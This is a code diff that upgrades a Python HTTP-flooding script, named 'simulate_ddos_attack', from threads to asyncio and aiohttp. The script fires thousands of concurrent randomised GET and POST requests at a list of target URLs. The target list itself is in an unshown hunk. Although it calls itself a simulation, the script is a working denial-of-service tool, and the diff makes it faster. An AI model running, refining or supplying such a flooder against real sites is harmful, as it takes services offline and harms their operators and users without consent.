@@ -1,31 +1,42 @@
-import requests
-import threading
 import time
 import random
+import logging
+import asyncio
+import aiohttp
 
-def send_requests(target_url, num_requests):
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s:%(message)s')
+
+async def send_async_requests(session, target_url, num_requests):
     for _ in range(num_requests):
         try:
             method = random.choice(["GET", "POST"])
             if method == "GET":
-                requests.get(target_url)
+                async with session.get(target_url) as response:
+                    await response.text()
             else:
-                requests.post(target_url, data={"key": "value"})
-            time.sleep(random.uniform(0.01, 0.1))  # Random delay between requests
+                async with session.post(target_url, data={"key": "value"}) as response:
+                    await response.text()
+            await asyncio.sleep(random.uniform(0.01, 0.1))  # Random delay between requests
         except Exception as e:
-            pass  # Handle potential exceptions like connection errors
+            logging.error(f"Request failed: {e}")
 
-def simulate_ddos_attack(target_url, total_requests, num_threads):
+async def simulate_ddos_attack(target_url, total_requests, num_threads):
     requests_per_thread = total_requests // num_threads
-    threads = []
+    tasks = []
+    async with aiohttp.ClientSession() as session:
+        for _ in range(num_threads):
+            task = asyncio.create_task(send_async_requests(session, target_url, requests_per_thread))
+            tasks.append(task)
+        await asyncio.gather(*tasks)
 
-    for _ in range(num_threads):
-        thread = threading.Thread(target=send_requests, args=(target_url, requests_per_thread))
-        threads.append(thread)
-        thread.start()
-
-    for thread in threads:
-        thread.join()
+def run_ddos_simulation(target_urls, total_requests, num_threads):
+    start_time = time.time()
+    loop = asyncio.get_event_loop()
+    for target_url in target_urls:
+        loop.run_until_complete(simulate_ddos_attack(target_url, total_requests, num_threads))
+    end_time = time.time()
+    logging.info(f"Simulated DDoS attack completed in {end_time - start_time:.2f} seconds")
 
 if __name__ == "__main__":
     target_urls = [
@@ -38,9 +49,4 @@ if __name__ == "__main__":
     total_requests = 10000  # Total number of requests
     num_threads = 100       # Number of concurrent threads
 
-    start_time = time.time()
-    for target_url in target_urls:
-        simulate_ddos_attack(target_url, total_requests, num_threads)
-    end_time = time.time()
-
-    print(f"Simulated DDoS attack completed in {end_time - start_time:.2f} seconds")
+    run_ddos_simulation(target_urls, total_requests, num_threads)
